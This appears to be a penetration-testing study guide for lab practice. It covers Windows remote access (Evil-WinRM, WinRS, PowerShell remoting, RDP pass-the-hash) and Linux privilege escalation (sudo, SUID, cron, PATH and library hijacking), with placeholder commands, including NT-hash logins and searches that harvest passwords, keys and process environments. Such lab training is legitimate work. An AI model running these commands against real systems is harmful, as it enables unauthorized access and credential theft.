text: id="evil-winrm">6.4.4.12.6.1.1 Evil-WinRM <h6

title: 6.4.4.12.6.1.1.1 Password; omit -p to prompt where supported
text: id="variant-6-4-4-12-6-1-1-1">6.4.4.12.6.1.1.1 Password; omit -p to prompt where supported # Password; omit -p to prompt where supported evil-winrm -i TARGET_HOST -u USER -p 'PASSWORD' <h6

title: 6.4.4.12.6.1.1.2 NT hash
text: id="variant-6-4-4-12-6-1-1-2">6.4.4.12.6.1.1.2 NT hash # NT hash evil-winrm -i TARGET_HOST -u USER -H NT_HASH <h6

title: 6.4.4.12.6.1.1.3 HTTPS listener
text: id="variant-6-4-4-12-6-1-1-3">6.4.4.12.6.1.1.3 HTTPS listener # HTTPS listener evil-winrm -i TARGET_HOST -u USER -p 'PASSWORD' -S -P 5986 Current Evil-WinRM ticket-file support: evil-winrm -i TARGET_FQDN -r DOMAIN -K USER.ccache --spn HTTP Need: reachable 5985/5986, an enabled WinRM/PowerShell endpoint and endpoint authorization. The identity is commonly an administrator or a member of the applicable remote-management group, but endpoint SDDL/policy is decisive. Kerberos requires the FQDN/SPN, realm/KDC configuration and a compatible ticket. <h5

title: 6.4.4.12.6.1.2 Native WinRS
text: id="native-winrs">6.4.4.12.6.1.2 Native WinRS winrs /r:TARGET_HOST /u:DOMAIN\USER /p:PASSWORD "cmd /c hostname & whoami" To avoid retaining a password on the command line, use the current authorized Windows credential context where possible: winrs /r:TARGET_HOST "cmd /c hostname & whoami" WinRS uses WinRM. A non-administrator can require /noprofile depending on endpoint configuration. /allowdelegate affects onward credential use and is not a default fix for the double-hop problem. <h5

title: 6.4.4.12.6.1.3 PowerShell remoting
text: id="powershell-remoting">6.4.4.12.6.1.3 PowerShell remoting Test-WSMan TARGET_HOST $Credential = Get-Credential 'DOMAIN\USER' Invoke-Command -ComputerName TARGET_HOST -Credential $Credential -ScriptBlock { hostname whoami /all } $Session = New-PSSession -ComputerName TARGET_HOST -Credential $Credential Enter-PSSession -Session $Session A hostname normally supports Negotiate/Kerberos in a domain. An IP address requires explicit credentials and generally HTTPS or a tightly scoped TrustedHosts configuration. Do not weaken global TrustedHosts merely to hide DNS/SPN mistakes. <h3

text: id="find-the-clue-from-your-starting-access-8">6.4.4.13.2.1 Find the clue from your starting access Where to investigate: Check the destination RDP endpoint and use actual group/logon-policy evidence for the candidate identity; determine whether password or Restricted Admin is intended. Discovery action — reference example: Execution context, effects and stopping rule Host/access: Identified authentication material, destination service reachability and a candidate authorized identity Requires: Allowed account/session policy and compatible client/NLA/TLS; hash-based Restricted Admin has additional supported-policy/admin requirements Action class: Remote authentication/execution; service/file mechanisms can change target state. Stop/verify: Verify destination, user/token and permitted desktop actions; keep credentials out of reusable screenshots/notes. Failure/next check: A valid password can still lack logon rights. NLA, TLS, domain qualification and Restricted Admin policy are separate conditions. Test-NetConnection TARGET -Port 3389 Illustrative evidence — synthetic, abbreviated: The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting. 3389: reachable Candidate identity: DOMAIN\USER Remote-interactive logon right: not yet confirmed Recognize this detail: RDP transport does not grant desktop access; Restricted Admin/hash use has additional requirements. Still missing before method selection: Check NLA/TLS, identity qualification, logon authorization and the chosen authentication mode. Outcome after checking Example and next decision Enabled after validation The authorized interactive logon opens under the verified token: choose RDP. Ruled out in this context The account lacks the required logon right or the hash route lacks Restricted Admin support: reject that variant. Inconclusive A generic connection error requires separating client/protocol/policy before judging the credential. If you do not yet have this clue: start with Match route, destination service and effective authorization . <h3

title: 6.4.4.13.5 Why it works
text: id="5-why-it-works-8">6.4.4.13.5 Why it works RDP is an access method, not automatic local elevation. Restricted Admin/hash use and ordinary password logon have different requirements and network credential behavior. <h3

title: 6.4.4.13.6 Execute and choose variants
text: id="6-execute-and-choose-variants-8">6.4.4.13.6 Execute and choose variants Check the installed binary name: command -v xfreerdp3 || command -v xfreerdp Password: xfreerdp3 /v:TARGET_HOST /d:DOMAIN /u:USER /p:'PASSWORD' /cert:ignore /dynamic-resolution +clipboard Older packages may expose the same syntax through xfreerdp . NT hash: xfreerdp3 /v:TARGET_HOST /d:DOMAIN /u:USER /pth:NT_HASH /cert:ignore /dynamic-resolution FreeRDP's /pth uses Restricted Admin mode. The target must support/permit that mode and the identity must be an administrator; ordinary Remote Desktop Users membership is not sufficient for Restricted Admin. Password-based RDP instead needs the Remote Desktop service, NLA compatibility and the effective “Allow log on through Remote Desktop Services” right without a deny override. Native client: mstsc.exe /v:TARGET_HOST mstsc.exe /restrictedAdmin /v:TARGET_HOST Ordinary RDP can place reusable user credentials in the destination's LSASS. Restricted Admin avoids sending those reusable credentials but prevents ordinary onward access as that user; treat the resulting session's network identity separately. Purpose: use a validated identity with Remote Desktop logon rights to establish a Windows desktop and verify the resulting source position. <h5

title: 6.4.4.13.6.1.1 Baseline: prompt for the password
text: id="baseline-prompt-for-the-password">6.4.4.13.6.1.1 Baseline: prompt for the password xfreerdp3 /v:TARGET /u:USER /dynamic-resolution /cert:ignore Some Kali releases expose xfreerdp instead of xfreerdp3 ; check command -v xfreerdp3 xfreerdp and the selected binary's /help output. Decisive output: a usable desktop establishes a remote session. Open PowerShell or Command Prompt and verify whoami , hostname and ipconfig before treating commands as target-origin execution. <summary

title: 6.4.4.13.6.1.1.1 Variant — domain identity
text: id="variant-6-4-4-13-6-1-1-1">6.4.4.13.6.1.1.1 Variant — domain identity xfreerdp3 /v:TARGET /u:USER /d:DOMAIN /dynamic-resolution /cert:ignore Local and domain accounts with the same username are different identities. Make the intended context explicit when results differ. <summary

title: 6.4.4.13.6.1.1.2 Variant — authentication only
text: id="variant-6-4-4-13-6-1-1-2">6.4.4.13.6.1.1.2 Variant — authentication only xfreerdp3 /v:TARGET /u:USER /d:DOMAIN /auth-only /cert:ignore This tests authentication without opening the UI. Success does not guarantee that all session policies or desktop initialization will permit a full session. <summary

title: 6.4.4.13.6.1.1.3 Variant — explicit password
text: id="variant-6-4-4-13-6-1-1-3">6.4.4.13.6.1.1.3 Variant — explicit password xfreerdp3 /v:TARGET /u:USER '/p:PASSWORD' /dynamic-resolution /cert:ignore Prefer prompting because command-line passwords can enter shell history and process listings. Failure cues: a certificate warning is not a credential result. NLA/security negotiation, account context, authentication, Remote Desktop logon rights and an already occupied/restricted session can fail separately. /cert:ignore is appropriate only for the controlled lab context because it removes certificate identity validation. Next: after verifying the host and identity, enumerate groups/privileges, files, local services/listeners and routes from the new source position. <h3

title: 5.1 Escalate privileges on Linux
text: id="escalate-privileges-on-linux">5.1 Escalate privileges on Linux Strategy map | Master Notes | Operational index | Cheatsheets For each candidate prove controlled object → effective permission → privileged consumer → execution identity → trigger → effect. Enumeration tools suggest candidates; they do not establish that chain. Speedrun blocks: 8. Documented methods: 16. Examples are hypothetical study material. Apply commands only to an assigned scope during the later practice phase. A method is enabled by its prerequisites; its presence here does not establish a vulnerability or practical mastery. <h2

title: 5.1.1 First pass: tools and findings
text: id="first-pass-tools-and-findings">5.1.1 First pass: tools and findings Use the branch matching the current host, identity and observed result. Tool output supplies leads; the linked procedure verifies and uses the exact condition. <h3

title: 5.1.1.1 Identify the session, then run LinPEAS early
text: id="identify-the-session-then-run-linpeas-early">5.1.1.1 Identify the session, then run LinPEAS early After checking id, architecture and shell availability, transfer a trusted reviewed LinPEAS copy using the transfer procedure. The sh invocation does not need an executable bit. Save output; use the local -h before selecting optional flags. id uname -m command -v bash python3 ls -ld /tmp sh ./linpeas.sh | tee linpeas.txt If sudo/NOPASSWD or an allowed binary: Run sudo -l and compare run-as, exact path and permitted arguments with the chosen escape. → Use an allowed sudo operation to cross a privilege boundary . If A root-owned SUID binary: Check the exact file, mount flags and its available privileged operation. → Use a SUID or SGID program's exposed privileged primitive . If A useful file capability: Match the capability to the exact executable operation and mount. → Use a file capability that enables a specific privileged operation . If A password, key or application config: Read the source file and identify which account/service it belongs to. → Recover credentials from Linux user, service and process trails . Otherwise: LinPEAS cannot run or shows no usable finding: use the native identity/permissions checks; quiet output does not prove no escalation. → Establish Linux state and choose an escalation candidate . <h3

title: 5.1.1.2 Check sudo rules against the actual binary
text: id="check-sudo-rules-against-the-actual-binary">5.1.1.2 Check sudo rules against the actual binary Use only the operation permitted by the entire rule. Select the matching GTFOBins mode/build instead of trying every example. sudo -n -l 2>&1 sudo -l If (root) NOPASSWD permits a useful interpreter/helper: Check argument restrictions and privilege retention, then use that exact permitted invocation. → Use an allowed sudo operation to cross a privilege boundary . If LD_PRELOAD is explicitly permitted/preserved: Verify a dynamically linked allowed program and the variable-setting permission. → Load a controlled library through a permitted sudo environment . Otherwise: No useful sudo rule: check SUID/SGID and capabilities; do not keep trying sudo payloads. → Use a SUID or SGID program's exposed privileged primitive . <h3

title: 5.1.1.3 Catch short-lived root jobs with pspy
text: id="catch-short-lived-root-jobs-with-pspy">5.1.1.3 Catch short-lived root jobs with pspy Use a reviewed binary matching the target architecture; keep it running long enough to observe the suspected schedule. Stop after collecting the needed events. ./pspy64 If UID=0 repeatedly invokes a script under /opt or another path: Check the script and each parent with namei/stat/getfacl, then identify the schedule/trigger. → Control a script, binary or configuration consumed by a privileged job/service . If A privileged job invokes a helper without an absolute path: Inspect the real PATH and a writable directory searched first. → Hijack an unqualified helper through controlled PATH resolution . Otherwise: No event was observed: inspect cron/timers/services directly rather than assuming no privileged job exists. → Control a script, binary or configuration consumed by a privileged job/service . <h3

title: 5.1.1.4 Test SUID/capability findings manually
text: id="test-suidcapability-findings-manually">5.1.1.4 Test SUID/capability findings manually Use native discovery alongside the tool output; a flagged executable is only useful if it retains a relevant privilege. find / -xdev -type f -perm -4000 -ls 2>/dev/null find / -xdev -type f -perm -2000 -ls 2>/dev/null findmnt -T /PATH/TO/BINARY If A root-owned SUID program exposes a usable operation: Check nosuid, exact build and effective identity after that operation. → Use a SUID or SGID program's exposed privileged primitive . If An executable has a useful file capability: Check the named capability and its effective operation under this mount. → Use a file capability that enables a specific privileged operation . If A root-consumed file/parent is writable: Validate the real consumer and trigger before modification. → Prove effective file, directory, ACL and mount control . Otherwise: No useful privileged executable: return to secrets, scheduled consumers, mounts and local-only services. → Recover credentials from Linux user, service and process trails . <h2

title: 5.1.2 Discovery workflow
text: id="discovery-workflow">5.1.2 Discovery workflow Start with a low-privileged Linux command channel. No sudo rule, writable privileged script or usable SUID binary is assumed. Follow these observations into a method; the detailed recognition routes below show synthetic output and the checks still needed. Establish effective IDs/groups, mounts, processes and exact sudo rules: Establish Linux state and choose an escalation candidate . Follow readable application/history/process artifacts into typed credentials: Recover credentials from Linux user, service and process trails . Inspect sudo/SUID/capabilities and prove effective object/parent permissions: Use an allowed sudo operation to cross a privilege boundary ; Use a SUID or SGID program's exposed privileged primitive ; Use a file capability that enables a specific privileged operation ; Prove effective file, directory, ACL and mount control . Identify each job/service's real identity, consumed path and trigger; only then examine resolution abuse: Control a script, binary or configuration consumed by a privileged job/service ; Hijack an unqualified helper through controlled PATH resolution ; Turn wildcard-expanded filenames into privileged command options ; Control a privileged program's shared-library resolution . Investigate daemon/mount/software candidates against their exact conditions: Use privileged group, daemon or container-management control ; Exploit a permission-backed mount, NFS mapping or local service ; Select an evidence-matched Linux software or kernel exploit . Decision rule: an observed clue opens a candidate. Choose it only after the missing conditions are verified; a failed check rules out that context, while unavailable evidence stays inconclusive . <h2

title: 5.1.3 Method families
text: id="method-families">5.1.3 Method families Identity, permissions and secret sources: Establish Linux state and choose an escalation candidate , Prove effective file, directory, ACL and mount control , Recover credentials from Linux user, service and process trails . Delegated and executable privilege: Use an allowed sudo operation to cross a privilege boundary , Load a controlled library through a permitted sudo environment , Use a SUID or SGID program's exposed privileged primitive , Use a file capability that enables a specific privileged operation . Privileged consumers and resolution: Control a script, binary or configuration consumed by a privileged job/service , Hijack an unqualified helper through controlled PATH resolution , Turn wildcard-expanded filenames into privileged command options , Control a privileged program's shared-library resolution , Change a writable account or privilege-policy file . Daemon, mount and software routes: Use privileged group, daemon or container-management control , Exploit a permission-backed mount, NFS mapping or local service , Select an evidence-matched Linux software or kernel exploit . Candidate generation: Use enumeration tools to generate manually testable candidates . <h2

title: 5.1.5.2.1 Find the clue from your starting access
text: id="find-the-clue-from-your-starting-access">5.1.5.2.1 Find the clue from your starting access Where to investigate: At a new shell collect effective IDs/groups, current mounts, root-owned activity and exact sudo rules before choosing a technique. Discovery action — reference example: Execution context, effects and stopping rule Host/access: A verified Linux foothold with a known effective UID, groups and filesystem context Requires: A working command channel and accurate effective identity, group, mount and process context Action class: Includes enumeration and permission-backed privileged execution; distinguish the selected step. Stop/verify: Record effective UID/groups, host/namespace and the exact candidate permission; re-check identity after every claimed escalation. Failure/next check: Missing tools or permission-denied inventory is partial visibility. Use built-ins and inspect concrete application paths rather than claiming no escalation path exists. id findmnt ps auxww sudo -l Illustrative evidence — synthetic, abbreviated: The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting. uid=USER_ID(APP_USER) groups=APP_GROUP (root) NOPASSWD: /usr/bin/find root ... /bin/sh /OPT_PATH/backup.sh Recognize this detail: The sudo rule and privileged backup consumer open different candidate families; neither should be replaced by an automatic kernel choice. Still missing before method selection: For each candidate establish exact permitted operation/object, run-as identity and trigger. Outcome after checking Example and next decision Enabled after validation A candidate's complete permission/consumer chain is validated: choose that specific method. Ruled out in this context A highlighted process belongs to the same low user: reject its assumed privilege gain. Inconclusive Permission-denied inventory is incomplete visibility; use known application paths and supported built-ins. If you do not yet have this clue: start with Verify command execution, host and represented identity . <h3

text: id="5-why-it-works">5.1.5.5 Why it works Privileges belong to effective identity and execution context, not a username string. A container root UID can differ from host root; a new identity changes readable files and available controls. <h3

title: 5.1.5.6 Execute and choose variants
text: id="6-execute-and-choose-variants">5.1.5.6 Execute and choose variants Decisive output: current identity/groups, OS/kernel/architecture, network position, root-owned activity, mounts and exact sudo rules. hostname; id; groups uname -a; cat /etc/os-release; getconf LONG_BIT pwd; umask; env ip addr; ip route; ss -lntup; ss -lxnp ps auxf mount; findmnt; lsblk; df -hT sudo -n -l 2>&1 sudo -l getent passwd awk -F: '$3 == 0 || $7 !~ /(nologin|false)$/ {print $1,$3,$4,$6,$7}' /etc/passwd Priority: credentials/sudo → root-consumed writable objects → SUID/capabilities → privileged groups/mounts/local services → PATH/libraries/wildcards → software/kernel. id; whoami; groups hostname; pwd ip addr; ip route After root, re-enumerate newly readable credentials, services, listeners, mounts and routes. Capture the exact command, decisive output and state transition required by the objective; keep target details and proof material private. <h3

title: 5.1.6.2.1 Find the clue from your starting access
text: id="find-the-clue-from-your-starting-access-1">5.1.6.2.1 Find the clue from your starting access Where to investigate: From a real privileged script/binary/configuration path inspect every parent, ACL and effective mount before assuming control. Discovery action — reference example: Execution context, effects and stopping rule Host/access: A verified Linux foothold with a known effective UID, groups and filesystem context Requires: Effective access through every parent/ACL and mount; a privileged consumer and trigger are identified separately Action class: Includes enumeration and permission-backed privileged execution; distinguish the selected step. Stop/verify: Prove the specific read/write/replace action and consumer path; world-writable alone is not the complete escalation chain. Failure/next check: A read-only/noexec/nosuid mount changes which effects are possible. Find another consumer rather than assuming every permission bypasses mount policy. namei -l /PATH/TO/OBJECT getfacl -p /PATH/TO/OBJECT /PATH/TO/PARENT findmnt -T /PATH/TO/OBJECT Illustrative evidence — synthetic, abbreviated: The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting. file: root-owned, not directly writable parent: current group has write+execute mount: rw Recognize this detail: Parent replacement can provide a control primitive even when the existing file's write bit is absent. Still missing before method selection: Run namei -l, stat and getfacl on the exact path and its parents, then findmnt -T for ro/noexec/nosuid. Check the identity and trigger of the process that uses this path; write permission alone is not execution. Outcome after checking Example and next decision Enabled after validation The precise object can be replaced and is consumed under a higher identity: choose that control path. Ruled out in this context Parent/file rights do not grant the needed operation: reject that proposed write. Inconclusive An ACL listing without effective trustee/mount context leaves control unresolved. If you do not yet have this clue: start with Establish Linux state and choose an escalation candidate . <h3

title: 5.1.6.5 Why it works
text: id="5-why-it-works-1">5.1.6.5 Why it works Directory write plus traversal can allow replacement without direct file write. ACLs, sticky directories, immutable attributes and mount options can change the effective operation. <h3

title: 5.1.6.6 Execute and choose variants
text: id="6-execute-and-choose-variants-1">5.1.6.6 Execute and choose variants namei -l /PATH/TO/OBJECT stat /PATH/TO/OBJECT /PATH/TO/PARENT getfacl -p /PATH/TO/OBJECT /PATH/TO/PARENT 2>/dev/null findmnt -T /PATH/TO/OBJECT -o TARGET,SOURCE,FSTYPE,OPTIONS Directory write+execute can permit replacement even when the file is not writable. ACLs can add/remove effective access. nosuid defeats SUID/SGID and file-capability effects; noexec blocks direct execution; ro blocks changes. Discover writable objects, then prioritize root-owned configuration, scripts, binaries and parents under /etc , /opt , /usr/local , application paths and service working directories: find / -xdev -type f -writable -ls 2>/dev/null find / -xdev -type d -writable -ls 2>/dev/null <h3

title: 5.1.7.2.1 Find the clue from your starting access
text: id="find-the-clue-from-your-starting-access-2">5.1.7.2.1 Find the clue from your starting access Where to investigate: Follow observed application processes and directories into readable configuration, history and environment; prioritize paths tied to actual services. Discovery action — reference example: Execution context, effects and stopping rule Host/access: A verified Linux foothold with a known effective UID, groups and filesystem context Requires: Read access to the artifact; exact account/service context; session/agent access must include a usable live identity Action class: Includes enumeration and permission-backed privileged execution; distinguish the selected step. Stop/verify: Record source, exact material type and validated identity/service; keep real secrets in private lab records. Failure/next check: Stale examples and unrelated tokens are common. A denied process read is a visibility limit, not evidence that no credentials exist elsewhere. ps auxww history find /opt /var/www /srv -maxdepth 3 -type f -readable 2>/dev/null Illustrative evidence — synthetic, abbreviated: The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting. Process: APP_SERVICE --config /opt/APP/config.ini Readable file: /opt/APP/config.ini Setting: database_user=DB_USER; password=PASSWORD Recognize this detail: An actual service's readable configuration supplies an identity-labelled secret candidate. Still missing before method selection: Read the named config/history/process artifact and record the user, service and host it belongs to. Classify a recovered password/key, test one matching service context and verify the accepted identity before trying reuse elsewhere. Outcome after checking Example and next decision Enabled after validation The secret works in its verified identity/service context: use that access and re-enumerate. Ruled out in this context The value is a stale example and no longer accepted: reject that credential pairing. Inconclusive A token -like string without service/account context requires provenance work before reuse. If you do not yet have this clue: start with Establish Linux state and choose an escalation candidate . <h3

title: 5.1.7.5 Why it works
text: id="5-why-it-works-2">5.1.7.5 Why it works Secrets can outlive the operation that created them. Process visibility and readable environment depend on permissions; finding a socket does not prove the right to use the associated session. <h3

title: 5.1.7.6 Execute and choose variants
text: id="6-execute-and-choose-variants-2">5.1.7.6 Execute and choose variants history 2>/dev/null find /home /root -maxdepth 3 -type f \ \( -name '.*history' -o -name '*.conf' -o -name '*.ini' -o -name '*.env' \ -o -name 'id_*' -o -name '*.pem' -o -name '*.key' -o -name '*.bak' \) \ -readable 2>/dev/null grep -RniE 'pass(word)?|secret|token|api[_-]?key|connection(string)?' \ /var/www /opt /srv /etc 2>/dev/null | head -n 200 Inspect process arguments and readable process environment: ps auxww ps eww -u root 2>/dev/null tr '\0' ' ' < /proc/PID/cmdline 2>/dev/null; echo tr '\0' '\n' < /proc/PID/environ 2>/dev/null Check reusable local sessions/agents only when their sockets are accessible: w; who; last -n 20 env | grep -E 'SSH_AUTH_SOCK|TMUX|STY' tmux ls 2>/dev/null screen -ls 2>/dev/null find /tmp /run -maxdepth 3 -type s -ls 2>/dev/null An agent, tmux/screen or daemon socket needs effective socket access and a useful authenticated/privileged session. Presence alone is not session hijacking. Next: identify the value's user/service context, validate the smallest relevant transition ( su , sudo , SSH or application authentication), then re-enumerate. Use credential handling for cracking/reuse. find /home /var/www /opt /srv -type f \ \( -iname '*.conf' -o -iname '*.ini' -o -iname '*.env' -o -iname '*.bak' \ -o -iname '*.old' -o -iname '*.key' -o -iname '*.pem' \) 2>/dev/null rg -ni 'password|passwd|token|secret|api[_-]?key|connection(string)?' \ /var/www /opt /srv 2>/dev/null <h3

title: 5.1.8.2 Recognition clues
text: id="2-recognition-clues-3">5.1.8.2 Recognition clues sudo -l grants an operation under a more useful identity. <h4

title: 5.1.8.2.1 Find the clue from your starting access
text: id="find-the-clue-from-your-starting-access-3">5.1.8.2.1 Find the clue from your starting access Where to investigate: Run the exact sudo policy query from the current user and read run-as identity, executable, arguments and tags. Discovery action — reference example: Execution context, effects and stopping rule Host/access: A verified Linux foothold with a known effective UID, groups and filesystem context Requires: Exact executable/run-as/argument rule permits a useful primitive; password tags, environment and policy do not invalidate it Action class: Includes enumeration and permission-backed privileged execution; distinguish the selected step. Stop/verify: Verify the executed run-as identity and effective UID; preserve the matching rule and successful operation. Failure/next check: Restricted arguments, another run-as user, privilege dropping, NOEXEC or MAC policy can block the candidate. Evaluate another permitted primitive. sudo -n -l 2>&1 sudo -l Illustrative evidence — synthetic, abbreviated: The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting. User USER may run: (root) NOPASSWD: /usr/bin/find Recognize this detail: The rule permits that exact program as root; its documented privileged operation becomes a candidate. Discovery action — reference example: Execution context, effects and stopping rule Host/access: A verified Linux foothold with a known effective UID, groups and filesystem context Requires: Effective SUID/SGID on the relevant mount; a program operation preserves and exposes useful privilege Action class: Includes enumeration and permission-backed privileged execution; distinguish the selected step. title: 5.1.12.2.1 Find the clue from your starting access
text: id="find-the-clue-from-your-starting-access-7">5.1.12.2.1 Find the clue from your starting access Where to investigate: Inspect actual cron/systemd definitions and running processes, then follow their action paths into permission checks. Discovery action — reference example: Execution context, effects and stopping rule Host/access: A verified Linux foothold with a known effective UID, groups and filesystem context Requires: Effective object control, actual privileged consumer identity, correct path/environment and an available schedule/restart trigger Action class: Includes enumeration and permission-backed privileged execution; distinguish the selected step. Stop/verify: Verify the consumer's resulting effect and identity; editing a file without an observed trigger is incomplete. Failure/next check: Wrong path, service sandbox, missing trigger or another effective identity breaks the chain. Use process observation and permission checks. cat /etc/crontab systemctl list-timers --all ps auxww Illustrative evidence — synthetic, abbreviated: The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting. * * * * * root /opt/APP/backup.sh Script path: /opt/APP/backup.sh Recognize this detail: The schedule explicitly names a privileged consumer and an exact file to inspect. Still missing before method selection: Observe the actual command and UID with pspy or inspect the unit with systemctl cat/show. Run namei -l, stat and getfacl on the consumed path and parents; identify the timer, restart or invocation before changing the file. Outcome after checking Example and next decision Enabled after validation The controlled object is consumed at a confirmed privileged trigger: choose the job/service method. Ruled out in this context The real job runs as the same low user: reject privilege gain through that action. Inconclusive A stale job file without observed activity/usable trigger leaves execution unresolved. title: 5.1.12.5 Why it works
text: id="5-why-it-works-7">5.1.12.5 Why it works Writable scripts and service units become useful only when the privileged consumer actually reads them. A timer schedule and a right to restart a service are different triggers. <h3

title: 5.1.12.6 Execute and choose variants
text: id="6-execute-and-choose-variants-7">5.1.12.6 Execute and choose variants crontab -l 2>/dev/null cat /etc/crontab cat /etc/anacrontab 2>/dev/null atq 2>/dev/null ls -la /etc/cron.* /var/spool/cron 2>/dev/null grep -RniE 'CRON|CMD' /var/log/syslog /var/log/cron* 2>/dev/null | tail -n 100 systemctl list-timers --all systemctl list-unit-files --type=service systemctl list-units --type=service --state=running systemctl cat UNIT systemctl show UNIT -p User -p Group -p ExecStart -p WorkingDirectory -p EnvironmentFiles Observe short-lived commands: ./pspy64 ./pspy64 -pf -i 1000 Validate every referenced script, binary, configuration, environment file, plugin and parent: namei -l /PATH/TO/OBJECT stat /PATH/TO/OBJECT /PATH/TO/PARENT getfacl -p /PATH/TO/OBJECT /PATH/TO/PARENT 2>/dev/null Prove: exact object is controllable → job/service consumes it → process runs as a higher identity → schedule/restart/other trigger is available. A writable unit still needs a privileged reload/restart or automatic trigger. Cron uses a different/minimal environment. Apply the same proof to backup, logrotate, package-maintenance and custom housekeeping hooks: configuration visibility or a writable output is insufficient unless a higher-privileged consumer interprets attacker-controlled input. <h3

Interpretation: privileged consumption is confirmed. <h3

Discovery action — reference example: Execution context, effects and stopping rule Host/access: A verified Linux foothold with a known effective UID, groups and filesystem context Requires: A controlled directory precedes the real helper in the consumer's effective PATH; execution preserves useful privilege and a trigger exists Action class: Includes enumeration and permission-backed privileged execution; distinguish the selected step. Stop/verify: Prove actual helper selection and effective identity through a controlled effect. Failure/next check: secure_path, absolute paths, a changed working directory or privilege dropping can invalidate the route. printf '%s\n' "$PATH" namei -l /PATH/TO/CANDIDATE_DIRECTORY strings /PATH/TO/REVIEWED_BINARY Illustrative evidence — synthetic, abbreviated: The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting. Helper invocation: backup_tool ARGUMENT Consumer PATH: /CONTROLLED_DIRECTORY:/usr/bin:/bin Recognize this detail: An unqualified helper can resolve through the controlled earlier directory in the consumer's environment. Still missing before method selection: Find the helper name in the privileged script or observed pspy command. Check that it is unqualified and identify the consumer's real PATH; a writable directory matters only if that consumer searches it first. Outcome after checking Example and next decision Enabled after validation The consumer selects the controlled helper under the higher identity: use the verified resolution route. Ruled out in this context It invokes /usr/bin/backup_tool by absolute path or uses a protected PATH: reject this hijack. Inconclusive A strings result alone does not prove an executed call or inherited PATH; inspect/observe the consumer. text: id="find-the-clue-from-your-starting-access-9">5.1.14.2.1 Find the clue from your starting access Where to investigate: Read the exact privileged command line and inspect the directory over which its shell glob expands. Discovery action — reference example: Execution context, effects and stopping rule Host/access: A verified Linux foothold with a known effective UID, groups and filesystem context Requires: Control of expanded filenames; compatible option parsing and argument placement; useful program feature and privileged trigger Action class: Includes enumeration and permission-backed privileged execution; distinguish the selected step. Stop/verify: Verify the utility's actual triggered effect and its identity, not merely that special filenames exist. Failure/next check: A different utility build, -- separator, changed directory or absent glob can disprove this path. cat /PATH/TO/REVIEWED_JOB_SCRIPT ls -la /PATH/TO/JOB_DIRECTORY namei -l /PATH/TO/JOB_DIRECTORY Illustrative evidence — synthetic, abbreviated: The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting. Job command: tar ... * Working directory: /CONTROLLED_DIRECTORY Caller: root Recognize this detail: Controlled filenames may become utility arguments after glob expansion; the exact utility and option ordering decide the method. Still missing before method selection: Inspect the exact privileged command: confirm that a wildcard expands attacker-controlled names into option positions and that the utility interprets those options. A writable directory without that command/trigger does not enable this route. Outcome after checking Example and next decision Enabled after validation The actual invocation accepts the useful injected option and privileged effect is verified: select that mechanism. Ruled out in this context The job uses -- before expanded filenames or no compatible glob: reject that option-injection route. Inconclusive A wildcard-looking string without execution/working-directory evidence is only a candidate. Do not assume every wildcard or utility accepts filename-derived options. <h3

title: 5.1.15.2.1 Find the clue from your starting access
text: id="find-the-clue-from-your-starting-access-10">5.1.15.2.1 Find the clue from your starting access Where to investigate: Inspect the reviewed privileged executable's dependencies/search paths and permission-check the actual selected library directory. Discovery action — reference example: Execution context, effects and stopping rule Host/access: A verified Linux foothold with a known effective UID, groups and filesystem context Requires: Actual privileged load from a controlled location, matching ABI/name and required symbols, plus a trigger Action class: Includes enumeration and permission-backed privileged execution; distinguish the selected step. Stop/verify: Prove the selected library path and effective execution identity; retain dependency and trigger evidence. Failure/next check: Static linking, secure-loader sanitization, a different selected library or missing symbols breaks the route. readelf -d /PATH/TO/BINARY namei -l /PATH/TO/LIBRARY_DIRECTORY Illustrative evidence — synthetic, abbreviated: The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting. NEEDED: libAPP.so RUNPATH: /CONTROLLED_LIBRARY_DIRECTORY Recognize this detail: A named dependency plus a potentially controlled search location is a loader-resolution candidate. Still missing before method selection: Verify actual runtime selection, ABI/symbols, secure-execution rules, retained privilege and a trigger. Outcome after checking Example and next decision Enabled after validation The higher-identity process actually loads the controlled compatible library: select that chain. Ruled out in this context A protected earlier library or secure-loader behavior prevents selection: reject the assumed path. Inconclusive Static dependency output alone leaves actual privileged resolution unknown. If you do not yet have this clue: start with Use a SUID or SGID program's exposed privileged primitive . <h3

title: 5.1.15.4 Discover and verify prerequisites
text: id="4-discover-and-verify-prerequisites-10">5.1.15.4 Discover and verify prerequisites readelf -d /PATH/TO/BINARY namei -l /PATH/TO/LIBRARY_DIRECTORY file /PATH/TO/BINARY <h3

title: 5.1.15.5 Why it works
text: id="5-why-it-works-10">5.1.15.5 Why it works The dynamic loader resolves dependencies using context-specific rules. A writable directory is irrelevant if secure execution or an earlier trusted resolution prevents loading from it. <h3

title: 5.1.15.6 Execute and choose variants
text: id="6-execute-and-choose-variants-10">5.1.15.6 Execute and choose variants file /PATH/TO/BINARY readelf -d /PATH/TO/BINARY 2>/dev/null | grep -E 'RPATH|RUNPATH|NEEDED' ldd /PATH/TO/BINARY 2>/dev/null Need a privileged dynamically linked consumer plus a missing/selected library resolved from a writable location or a preserved loader variable. Secure-execution mode strips many loader variables from SUID/SGID programs. Prefer readelf over executing an untrusted file through an unsafe ldd implementation. For root-run scripts, inspect imports/includes and their actual search order. A writable current directory, module path or imported file can be a privileged input even when the main script is protected: grep -nE '^(import|from) |require\(|include|source |\. ' /PATH/TO/SCRIPT /PATH/TO/python3 -c 'import sys; print("\n".join(sys.path))' Prove the privileged interpreter uses the writable module/include before changing it. The interactive interpreter's search path may differ from cron/systemd/sudo. <h3

Interpretation: the library-consumption chain is verified. <h3

title: 5.1.16.2.1 Find the clue from your starting access
